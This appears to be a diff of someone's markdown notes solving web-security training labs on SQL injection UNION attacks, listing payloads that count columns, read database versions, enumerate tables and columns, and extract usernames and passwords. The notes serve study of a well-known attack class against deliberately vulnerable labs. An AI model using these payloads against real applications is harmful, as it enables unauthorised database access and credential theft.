@@ -77,108 +77,79 @@
 - Return Specific String
 `GET /filter?category=Gifts'+UNION+SELECT+NULL,'SI0fBf',NULL--`
 
-Lab: SQL injection UNION attack, retrieving data from other tables
+# Lab: SQL injection UNION attack, retrieving data from other tables
 
-This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
+### This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
 
-The database contains a different table called users, with columns called username and password.
+### The database contains a different table called users, with columns called username and password.
 
-To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
+### *To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.*
 
-# Number of Columns
+- Number of Columns
+`GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL--`
 
-GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL--
+- Extract Usernames and Passwords From Users table
+`GET /filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--`
 
-# Extract Usernames and Passwords From Users table
+# Lab: SQL injection UNION attack, retrieving multiple values in a single column
 
-# GET /filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--
+### This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
 
-Lab: SQL injection UNION attack, retrieving multiple values in a single column
+### The database contains a different table called users, with columns called username and password.
 
-This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+### *To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.*
 
-The database contains a different table called users, with columns called username and password.
+- Number of Columns
+`GET /filter?category=Lifestyle'+UNION+SELECT+NULL,NULL--`
 
-To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
+- Extract Usernames and Passwords From Users table
+`GET /filter?category=Gifts'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--`
 
-# Number of Columns
+# Lab: SQL injection attack, querying the database type and version on Oracle
 
-GET /filter?category=Lifestyle'+UNION+SELECT+NULL,NULL--
+### This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
 
-# Extract Usernames and Passwords From Users table
-
-# GET /filter?category=Gifts'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--
-
-Lab: SQL injection attack, querying the database type and version on Oracle
-
-This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
-
-# Determine Number of Columns using dual table (special built in table for Oracle)
-
+- Determine Number of Columns using dual table (special built in table for Oracle)
 `'+UNION+SELECT+NULL,NULL+FROM+dual--`
 
-# Query to get version info via banner
+- Query to get version info via banner
+`'+UNION+SELECT+BANNER,NULL+FROM+v$version--`
 
-'+UNION+SELECT+BANNER,NULL+FROM+v$version--
+# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
 
-Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+### This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
 
-This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
-
-# Determine Number of Columns
-
+- Determine Number of Columns
 `'+UNION+SELECT+NULL,NULL#`
 
-# Query to get version info via banner
+- Query to get version info via banner
+`'+UNION+SELECT+@@version,+NULL#`
 
-# `'+UNION+SELECT+@@version,+NULL#`
+# Lab: SQL injection attack, listing the database contents on non-Oracle databases
+- Determine Number of Columns
+`'+UNION+SELECT+NULL,NULL--`
 
-Lab: SQL injection attack, listing the database contents on non-Oracle databases
+- Retrieve List of Tables
+`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
 
-# Determine Number of Columns
+- Select Specific Table
+`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_jkofuc'`
 
-'+UNION+SELECT+NULL,NULL--
+- Select Column Names
+`'+UNION+SELECT+username_tyhqei,+password_jjgduf+FROM+users_jkofuc--`
 
-# Retrieve List of Tables
+# Lab: SQL injection attack, listing the database contents on Oracle
 
-'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+- Determine Number of Columns
+`'+UNION+SELECT+NULL,NULL+FROM+DUAL--`
 
-# Select Specific Table
+- Retrieve List of Tables
+`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
 
-'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_jkofuc'
+- Retrieve Columns From Table
+`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_EURTJQ'--`
 
-# Select Column Names
+- Retrieve Data From Columns
+`'+UNION+SELECT+USERNAME_UVKOLW,+PASSWORD_FQOUCN+FROM+USERS_EURTJQ--`
 
-'+UNION+SELECT+username_tyhqei,+password_jjgduf+FROM+users_jkofuc--
 
-Lab: SQL injection attack, listing the database contents on Oracle
-
-# Determine Number of Columns
-
-'+UNION+SELECT+NULL,NULL+FROM+DUAL--
-
-# Retrieve List of Tables
-
-'+UNION+SELECT+table_name,NULL+FROM+all_tables--
-
-# Retrieve Columns From Table
-
-'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_EURTJQ'--
-
-# Retrieve Data From Columns
-
-'+UNION+SELECT+USERNAME_UVKOLW,+PASSWORD_FQOUCN+FROM+USERS_EURTJQ--
-
-# ============================================
-
-# ============================================
-
-# ============================================
-
-# ============================================
-
-# ============================================
-
-# ============================================
-
-============================================
